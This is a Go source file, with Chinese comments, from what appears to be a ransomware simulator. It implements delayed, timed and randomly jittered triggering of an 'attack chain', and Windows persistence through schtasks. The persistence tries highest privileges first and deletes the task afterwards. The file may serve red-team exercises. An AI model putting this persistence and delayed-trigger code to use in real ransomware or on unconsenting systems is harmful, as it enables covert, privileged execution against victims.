// ransom_simulator_windows_schedule.go
// 定时触发模块：支持 --delay / --at / --random-delay 进程内定时，
// 以及 --persist-schedule 通过 schtasks 注册系统级计划任务（程序退出后仍可到点唤起）。
// 纯标准库实现，无第三方依赖。
package main

import (
	"fmt"
	mrand "math/rand"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

const (
	defaultScheduleTaskName = "RansomSimTask"
	scheduledRunMarker      = "--scheduled-run"
)

// formatDuration 把时长格式化为人类可读形式
func formatDuration(d time.Duration) string {
	if d < 0 {
		d = 0
	}
	d = d.Round(time.Second)
	h := int(d.Hours())
	m := int(d.Minutes()) % 60
	s := int(d.Seconds()) % 60
	switch {
	case h > 0:
		return fmt.Sprintf("%d小时%02d分%02d秒", h, m, s)
	case m > 0:
		return fmt.Sprintf("%d分%02d秒", m, s)
	default:
		return fmt.Sprintf("%d秒", s)
	}
}

// parseAbsoluteTime 解析 --at 参数，支持以下格式:
//
//	2006-01-02 15:04:05 / 2006-01-02 15:04 / 2006/01/02 15:04:05 / 2006/01/02 15:04
//	RFC3339 (2006-01-02T15:04:05+08:00)
//	15:04:05 / 15:04 (使用当天日期，若已过则顺延到次日)
func parseAbsoluteTime(spec string, now time.Time) (time.Time, error) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return time.Time{}, fmt.Errorf("时间参数为空")
	}

	layouts := []string{
		"2006-01-02 15:04:05",
		"2006-01-02 15:04",
		"2006/01/02 15:04:05",
		"2006/01/02 15:04",
		time.RFC3339,
		"15:04:05",
		"15:04",
	}

	var lastErr error
	for _, layout := range layouts {
		t, err := time.ParseInLocation(layout, spec, now.Location())
		if err != nil {
			lastErr = err
			continue
		}
		// 仅指定了时分秒（无年月日），使用当天日期
		if t.Year() <= 1 {
			t = time.Date(now.Year(), now.Month(), now.Day(), t.Hour(), t.Minute(), t.Second(), 0, now.Location())
			if !t.After(now) {
				t = t.Add(24 * time.Hour)
			}
		}
		return t, nil
	}

	return time.Time{}, fmt.Errorf("无法解析时间 %q (%v)", spec, lastErr)
}

// resolveStartTime 根据 --delay / --at / --random-delay 计算计划启动时刻
// 返回值 needWait 为 false 表示无需等待，可立即执行
func resolveStartTime(opt *options) (time.Time, bool, error) {
	now := time.Now()

	var target time.Time
	switch {
	case strings.TrimSpace(opt.atTime) != "":
		t, err := parseAbsoluteTime(opt.atTime, now)
		if err != nil {
			return now, false, err
		}
		target = t
	case opt.delay > 0:
		target = now.Add(opt.delay)
	default:
		// 无定时需求：仅保留随机抖动（如配置）
		if opt.randomDelay > 0 {
			jitter := time.Duration(mrand.Int63n(int64(opt.randomDelay) + 1))
			target = now.Add(jitter)
			return target, jitter > 0, nil
		}
		return now, false, nil
	}

	if opt.randomDelay > 0 {
		jitter := time.Duration(mrand.Int63n(int64(opt.randomDelay) + 1))
		target = target.Add(jitter)
	}

	if !target.After(now) {
		return now, false, nil
	}
	return target, true, nil
}

// waitUntilStart 等待到计划时间，返回 true 表示正常到达启动时刻
// 等待期间保持单实例锁，并支持 Ctrl+C / SIGTERM 中断
func waitUntilStart(target time.Time, opt *options) bool {
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(interrupt)

	total := time.Until(target)
	fmt.Printf("\n[阶段 0: 定时触发]\n")
	fmt.Printf("[*] 计划启动时间: %s (剩余 %s)\n", target.Format("2006-01-02 15:04:05"), formatDuration(total))
	if logEnabled {
		logOperation(fmt.Sprintf("进入定时等待，计划启动时间 %s (剩余 %s)", target.Format("2006-01-02 15:04:05"), formatDuration(total)))
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	lastLog := time.Now()

	for {
		select {
		case <-interrupt:
			fmt.Println("\n[!] 收到中断信号，定时等待已取消，任务终止。")
			if logEnabled {
				logOperation("定时等待被中断信号取消")
			}
			return false
		case <-ticker.C:
			remaining := time.Until(target)
			if remaining <= 0 {
				fmt.Printf("\r[*] 定时等待结束，到达启动时刻: %s                \n", time.Now().Format("2006-01-02 15:04:05"))
				if logEnabled {
					logOperation("定时等待结束，开始执行攻击链")
				}
				return true
			}
			elapsed := total - remaining
			percent := 0.0
			if total > 0 {
				percent = float64(elapsed) / float64(total) * 100
			}
			fmt.Printf("\r[*] 定时等待中: %.1f%% 已过 %s / 剩余 %s ", percent, formatDuration(elapsed), formatDuration(remaining))
			if time.Since(lastLog) >= 30*time.Second {
				lastLog = time.Now()
				if logEnabled {
					logOperation(fmt.Sprintf("定时等待进度: %.1f%%，剩余 %s", percent, formatDuration(remaining)))
				}
			}
		}
	}
}

// stripScheduleFlags 从参数中移除定时相关参数，避免计划任务唤起后再次进入等待
func stripScheduleFlags(args []string) []string {
	dropWithValue := map[string]bool{
		"--delay": true, "-delay": true,
		"--at": true, "-at": true,
		"--random-delay": true, "-random-delay": true,
		"--schedule-task-name": true, "-schedule-task-name": true,
	}
	dropAlone := map[string]bool{
		scheduledRunMarker: true,
		"--persist-schedule": true, "-persist-schedule": true,
		"--schedule-cleanup": true, "-schedule-cleanup": true,
	}

	var out []string
	for i := 0; i < len(args); i++ {
		arg := args[i]

		// --flag=value 形式
		if idx := strings.Index(arg, "="); idx > 0 && strings.HasPrefix(arg, "-") {
			name := arg[:idx]
			if dropWithValue[name] || dropAlone[name] {
				continue
			}
			out = append(out, arg)
			continue
		}

		if dropWithValue[arg] {
			i++ // 跳过其取值
			continue
		}
		if dropAlone[arg] {
			continue
		}
		out = append(out, arg)
	}

	// 追加标记，使计划任务唤起后的进程知道自己是"被调度执行"的
	out = append(out, scheduledRunMarker)
	return out
}

// wasScheduledRun 判断当前进程是否由计划任务唤起
func wasScheduledRun() bool {
	for _, arg := range os.Args[1:] {
		if arg == scheduledRunMarker {
			return true
		}
	}
	return false
}

// registerPersistentSchedule 通过 schtasks 注册一次性计划任务
// 注意: schtasks /sc once /st 只支持 24 小时内的时刻，超出请改用 --delay 常驻等待模式
func registerPersistentSchedule(opt *options, target time.Time) error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("无法获取程序路径: %w", err)
	}
	exePath, _ = filepath.Abs(exePath)

	taskName := strings.TrimSpace(opt.scheduleTaskName)
	if taskName == "" {
		taskName = defaultScheduleTaskName
	}

	// 防呆：schtasks 一次性任务只支持当天/次日的 HH:MM
	delta := time.Until(target)
	if delta > 24*time.Hour {
		return fmt.Errorf("--persist-schedule 仅支持 24 小时内的触发时间 (当前剩余 %s)，请改用 --delay 常驻等待", formatDuration(delta))
	}

	args := stripScheduleFlags(os.Args[1:])
	commandLine := fmt.Sprintf("\"%s\" %s", exePath, strings.Join(args, " "))
	stTime := target.Format("15:04")

	fmt.Printf("[*] 注册 Windows 计划任务: %s (触发时间 %s)\n", taskName, stTime)
	if target.Day() != time.Now().Day() {
		fmt.Printf("    [i] schtasks /sc once 仅支持时刻: 实际将在最近的 %s 触发（今天该时刻已过则为次日）\n", stTime)
	}
	if logEnabled {
		logOperation(fmt.Sprintf("注册计划任务 %s，触发时间 %s，命令行: %s", taskName, stTime, commandLine))
	}

	// 先删除同名任务，避免 /create 冲突
	_ = exec.Command("schtasks", "/delete", "/tn", taskName, "/f").Run()

	// 优先尝试最高权限运行；非管理员环境会被拒绝，退化为普通用户任务
	attempts := [][]string{
		{"/create", "/tn", taskName, "/tr", commandLine, "/sc", "once", "/st", stTime, "/rl", "HIGHEST", "/f"},
		{"/create", "/tn", taskName, "/tr", commandLine, "/sc", "once", "/st", stTime, "/f"},
	}

	var lastErr error
	var lastOut string
	for _, attempt := range attempts {
		out, err := exec.Command("schtasks", attempt...).CombinedOutput()
		if err == nil {
			fmt.Printf("[+] 计划任务已注册: %s\n", taskName)
			if logEnabled {
				logOperation("计划任务注册成功: " + taskName)
			}
			return nil
		}
		lastErr = err
		lastOut = strings.TrimSpace(string(out))
	}

	return fmt.Errorf("schtasks 创建任务失败: %v (%s)", lastErr, lastOut)
}

// cleanupPersistentSchedule 删除计划任务（计划任务唤起运行结束后调用）
func cleanupPersistentSchedule(taskName string) {
	if strings.TrimSpace(taskName) == "" {
		taskName = defaultScheduleTaskName
	}
	if err := exec.Command("schtasks", "/delete", "/tn", taskName, "/f").Run(); err != nil {
		fmt.Printf("[!] 清理计划任务失败: %v\n", err)
		if logEnabled {
			logOperation(fmt.Sprintf("清理计划任务失败: %v", err))
		}
		return
	}
	fmt.Printf("[+] 计划任务已清理: %s\n", taskName)
	if logEnabled {
		logOperation("计划任务已清理: " + taskName)
	}
}